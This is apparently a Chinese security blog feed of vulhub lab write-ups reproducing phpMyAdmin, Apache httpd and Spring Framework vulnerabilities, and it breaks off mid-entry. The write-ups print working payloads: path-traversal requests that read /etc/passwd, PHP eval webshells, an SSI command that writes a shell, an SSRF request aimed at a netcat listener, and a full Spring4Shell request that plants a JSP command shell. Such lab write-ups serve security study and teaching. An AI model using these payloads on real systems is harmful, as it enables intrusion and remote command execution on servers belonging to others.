        <content type="html"><![CDATA[<h1 id="PhpMyadmin-远程文件包含漏洞"><a href="#PhpMyadmin-远程文件包含漏洞" class="headerlink" title="PhpMyadmin 远程文件包含漏洞"></a>PhpMyadmin 远程文件包含漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>攻击者利用发现在服务器上包含（查看和潜在执行）文件的漏洞。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。</p><p>攻击者必须经过身份验证，但在这些情况下除外：</p><p><code>$ cfg [&#39;AllowArbitraryServer&#39;] = true</code>：攻击者可以指定他&#x2F;她已经控制的任何主机，并在phpMyAdmin上执行任意代码；</p><p><code>$ cfg [&#39;ServerDefault&#39;] = 0</code>：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>phpmyadmin 4.8.1-4.8.1</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd vulhub/phpmyadmin/CVE-2018-12613docker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>先打开网页<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/12/PhpMyadmin-Remote-File-Inclusion/image-20220512110650500.png" alt="image-20220512110650500"></p><p>可以通过远程文件包含查看<code>/etc/passwd</code></p><pre class=" language-bash"><code class="language-bash">?target<span class="token operator">=</span>db_sql.php%253f/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd</code></pre><p><code>ps:%25是%的url编码,%3f是?的url编码</code></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> phpmyadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PhpMyAdmin远程代码执行(CVE-2016-5734)</title>
      <link href="/2022/05/11/PhpMyAdmin-Remote-code-Execution/"/>
      <url>/2022/05/11/PhpMyAdmin-Remote-code-Execution/</url>
      
        <content type="html"><![CDATA[<h1 id="PhpMyAdmin远程代码执行"><a href="#PhpMyAdmin远程代码执行" class="headerlink" title="PhpMyAdmin远程代码执行"></a>PhpMyAdmin远程代码执行</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进<code>preg_replace</code>函数第一个参数中。</p><p>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用<code>\0</code>进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>phpmyadmin 4.6.x 版本（直至 4.6.3）</p><p>phpmyadmin 4.4.x 版本（直至 4.4.15.7）</p><p>phpmyadmin 4.0.x 版本（直至 4.0.10.16）</p><p>php版本： 4.3.0 ~5.4.6</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/phpmyadmin/CVE-2016-5734docker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>我们用大佬写的<a href="https://www.exploit-db.com/exploits/40185">poc</a></p><p>脚本利用</p><pre class=" language-Linux"><code class="language-Linux">python 40185.py -u root -p root http://192.168.3.151:8080</code></pre><p><img src="/2022/05/11/PhpMyAdmin-Remote-code-Execution/image-20220511203322617.png" alt="image-20220511203322617"></p><p>默认执行<code>uname</code></p><p>查看一下<code>/etc/passwd</code></p><pre class=" language-Linux"><code class="language-Linux">python 40185.py -u root -p root -c "system('cat /etc/passwd')" http://192.168.3.151:8080</code></pre><p><img src="/2022/05/11/PhpMyAdmin-Remote-code-Execution/image-20220511203531344.png" alt="image-20220511203531344"></p><p>结束！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> phpmyadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache SSI 远程命令执行漏洞</title>
      <link href="/2022/05/11/Apache-ssi-rce/"/>
      <url>/2022/05/11/Apache-ssi-rce/</url>
      
        <content type="html"><![CDATA[<h1 id="SSI远程命令执行"><a href="#SSI远程命令执行" class="headerlink" title="SSI远程命令执行"></a>SSI远程命令执行</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/ssi-rcedocker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先我们先看一下源代码</p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511191838904.png" alt="image-20220511191838904"></p><p>禁止上传php文件，此时可以上传<code>shtml</code>文件</p><p>打开<code>http://192.168.3.151:8080/upload.php</code></p><p>上传一个<code>.php</code>文件</p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511192221119.png" alt="image-20220511192221119"></p><p>抓包</p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511192243589.png" alt="image-20220511192243589"></p><p>改成<code>1.shtml</code>，内容改成</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>--<span class="token comment" spellcheck="true">#exec cmd='whoami'--></span></code></pre><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511192420061.png" alt="image-20220511192420061"></p><p>上传成功，此时我们访问一下<code>http://192.168.3.151:8080/1.shtml</code></p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511192451006.png" alt="image-20220511192451006"></p><p>成功执行命令，此时可以写入一句话木马</p><p>构造写入一句话木马的命令</p><pre class=" language-Linux"><code class="language-Linux"><!--#exec cmd="echo '<?php @eval($_POST["hack"]);?>' > ./hack.php"--></code></pre><p>上传！</p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511194326949.png" alt="image-20220511194326949"></p><p>然后访问<code>1.shtml</code></p><p>访问之后用蚁剑连接</p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511194440409.png" alt="image-20220511194440409"></p><p><img src="/2022/05/11/Apache-ssi-rce/image-20220511194450036.png" alt="image-20220511194450036"></p><p>结束！！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> Apache </tag>
            
            <tag> httpd </tag>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache HTTP Server路径穿越漏洞</title>
      <link href="/2022/05/10/Apache-HTTP-Path-traversal/"/>
      <url>/2022/05/10/Apache-HTTP-Path-traversal/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2021-41773"><a href="#CVE-2021-41773" class="headerlink" title="CVE-2021-41773"></a>CVE-2021-41773</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p><ul><li>版本等于2.4.49</li><li>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</li></ul><p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/CVE-2021-41337docker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先访问一个真实存在的目录，比如<code>/icons/</code></p><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161248403.png" alt="image-20220510161248403"></p><p>然后抓包，查看<code>/etc/passwd</code></p><pre class=" language-bash"><code class="language-bash">GET /icons/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd HTTP/1.1</code></pre><p>如果这样的话他会报错</p><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161347687.png" alt="image-20220510161347687"></p><p>因此需要url编码</p><pre class=" language-bash"><code class="language-bash">GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1</code></pre><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510161904932.png" alt="image-20220510161904932"></p><p>出来了！</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><blockquote><p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令</p></blockquote><p>修改参数</p><pre class=" language-bash"><code class="language-bash">GET /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1Host: 192.168.3.151:8080User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 6.1<span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:52.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3DNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Length: 7<span class="token keyword">echo</span><span class="token punctuation">;</span><span class="token function">id</span></code></pre><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510165306353.png" alt="image-20220510165306353"></p><p>成功！</p><h1 id="CVE-2021-42013"><a href="#CVE-2021-42013" class="headerlink" title="CVE-2021-42013"></a>CVE-2021-42013</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote><p>Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773">CVE-2021-41773</a>进行了修复，但这个修复是不完整的，CVE-2021-42013是对补丁的绕过。</p></blockquote><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/CVE-2021-42013docker-compose up -d</code></pre><h2 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>只需要把<code>.</code>进行两次url编码就好</p><p><code>.</code>一次编码是<code>%2e</code>，第二次编码是<code>%%32%65</code></p><p>查看<code>/etc/passwd</code></p><pre class=" language-bash"><code class="language-bash">GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1</code></pre><p><img src="/2022/05/10/Apache-HTTP-Path-traversal/image-20220510204708335.png" alt="image-20220510204708335"></p><p>ok这个也结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> Apache </tag>
            
            <tag> httpd </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache HTTP mod_proxy SSRF漏洞(CVE-2021-40438)</title>
      <link href="/2022/05/10/Apache-HTTP-mod-proxy/"/>
      <url>/2022/05/10/Apache-HTTP-mod-proxy/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-SSRF-漏洞-CVE-2021-40438"><a href="#Apache-SSRF-漏洞-CVE-2021-40438" class="headerlink" title="Apache SSRF 漏洞 CVE-2021-40438"></a>Apache SSRF 漏洞 CVE-2021-40438</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/CVE-2021-40438docker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先打开一个kali，监听端口</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>打开网站<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/10/Apache-HTTP-mod-proxy/image-20220510153901168.png" alt="image-20220510153901168"></p><p>ok抓包</p><p><img src="/2022/05/10/Apache-HTTP-mod-proxy/image-20220510154037083.png" alt="image-20220510154037083"></p><p>构造数据包</p><pre class=" language-bash"><code class="language-bash">GET /?unixspan class="token operator">|</span>http://192.168.3.134:4444 HTTP/1.1Host: 192.168.3.151:8080User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 6.1<span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:52.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3DNT: 1Connection: closeUpgrade-Insecure-Requests: 1</code></pre><p>有点长，但是没有关系，通过这个数据包就可以进行反向代理</p><p><img src="/2022/05/10/Apache-HTTP-mod-proxy/image-20220510154443673.png" alt="image-20220510154443673"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> Apache </tag>
            
            <tag> httpd </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache换行解析漏洞</title>
      <link href="/2022/05/10/Apache-Line-Feed/"/>
      <url>/2022/05/10/Apache-Line-Feed/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache换行解析漏洞"><a href="#Apache换行解析漏洞" class="headerlink" title="Apache换行解析漏洞"></a>Apache换行解析漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/CVE-2017-15715docker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>打开网页，看到是一个文件上传的页面</p><p><img src="/2022/05/10/Apache-Line-Feed/image-20220510141634311.png" alt="image-20220510141634311"></p><p>查看一下源代码</p><p><img src="/2022/05/10/Apache-Line-Feed/image-20220510142156436.png" alt="image-20220510142156436"></p><p>设置了一个黑名单</p><p>我们构造一个一句话木马上传试试</p><p><img src="/2022/05/10/Apache-Line-Feed/image-20220510142606445.png" alt="image-20220510142606445"></p><p>普通上传肯定会失败</p><p><img src="/2022/05/10/Apache-Line-Feed/image-20220510142624451.png" alt="image-20220510142624451"></p><p>先把<code>evil.php</code>转换成16进制</p><p><img src="/2022/05/10/Apache-Line-Feed/image-20220510143523756.png" alt="image-20220510143523756"></p><p>在<code>.php</code>后面加上<code>\x0A</code></p><p><img src="/2022/05/10/Apache-Line-Feed/image-20220510143706571.png" alt="image-20220510143706571"></p><p>上传成功</p><p><img src="/2022/05/10/Apache-Line-Feed/image-20220510144146463.png" alt="image-20220510144146463"></p><p>用菜刀连接</p><p><img src="/2022/05/10/Apache-Line-Feed/image-20220510144248548.png" alt="image-20220510144248548"></p><p>成功登进去</p><p><img src="/2022/05/10/Apache-Line-Feed/image-20220510144311994.png" alt="image-20220510144311994"></p><p>就这样，结束！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> Apache </tag>
            
            <tag> httpd </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache HTTPD 多后缀解析漏洞</title>
      <link href="/2022/05/09/Apache-parsing-vulnerability/"/>
      <url>/2022/05/09/Apache-parsing-vulnerability/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><pre><code>AddType text/html .htmlAddLanguage zh-CN .cn</code></pre><p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p><p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><pre><code>AddHandler application/x-httpd-php .php</code></pre><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/httpd/apache_parsing_vulnerabilitydocker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先我们打开网页</p><p><img src="/2022/05/09/Apache-parsing-vulnerability/image-20220509204650884.png" alt="image-20220509204650884"></p><p>是个上传文件的</p><p>查看一下源码</p><p><img src="/2022/05/09/Apache-parsing-vulnerability/image-20220509205313696.png" alt="image-20220509205313696"></p><p>发现要上传这些格式的</p><p>打开burpsuite，上传一个一句话木马然后抓包</p><p>一句话木马</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="/2022/05/09/Apache-parsing-vulnerability/image-20220509213419908.png" alt="image-20220509213419908"></p><p>根据多后缀解析，我们只要在名字里有<code>.php</code>就会执行，改文件名</p><p><img src="/2022/05/09/Apache-parsing-vulnerability/image-20220509213435967.png" alt="image-20220509213435967"></p><p>尝试上传！</p><p><img src="/2022/05/09/Apache-parsing-vulnerability/image-20220509213448491.png" alt="image-20220509213448491"></p><p>上传成功，并且把文件上传目录也给出来了</p><p>使用蚁剑连接</p><p><img src="/2022/05/09/Apache-parsing-vulnerability/image-20220509213531363.png" alt="image-20220509213531363"></p><p><img src="/2022/05/09/Apache-parsing-vulnerability/image-20220509213641064.png" alt="image-20220509213641064"></p><p>成功进入！！皆大欢喜！结束！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> Apache </tag>
            
            <tag> httpd </tag>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Framework远程代码执行漏洞(CVE-2022-22965)</title>
      <link href="/2022/05/08/Spring-Framework/"/>
      <url>/2022/05/08/Spring-Framework/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Framework远程代码执行漏洞"><a href="#Spring-Framework远程代码执行漏洞" class="headerlink" title="Spring Framework远程代码执行漏洞"></a>Spring Framework远程代码执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>在JDK 9+上运行的Spring MVC或Spring WebFlux应用程序可能存在通过数据绑定执行远程代码（RCE）的漏洞。</p><p>现在已知的利用方法要求应用程序以WAR部署的形式在Tomcat上运行，然而，该漏洞的性质更为普遍，可能有其他方法可以利用它。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>Spring Framework 5.3.X &lt; 5.3.18 、2.X &lt; 5.2.20 或者其他版本</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2022-22965docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先打开<code>http://192.168.3.151:8080/?name=test&amp;age=18</code></p><p><img src="/2022/05/08/Spring-Framework/image-20220508113603008.png" alt="image-20220508113603008"></p><p>构造数据包修改目标的tomcat日志路径与后缀，写入JSP文件</p><pre class=" language-Linux"><code class="language-Linux">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1Host: 192.168.3.151:8080User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Cookie: JSESSIONID=52F637A45D1E8B58214F3D85E166A223suffix: %>//c1: Runtimec2: <%DNT: 1Connection: closeUpgrade-Insecure-Requests: 1</code></pre><p><img src="/2022/05/08/Spring-Framework/image-20220508141959161.png" alt="image-20220508141959161"></p><p>可以执行任意命令</p><pre class=" language-Linux"><code 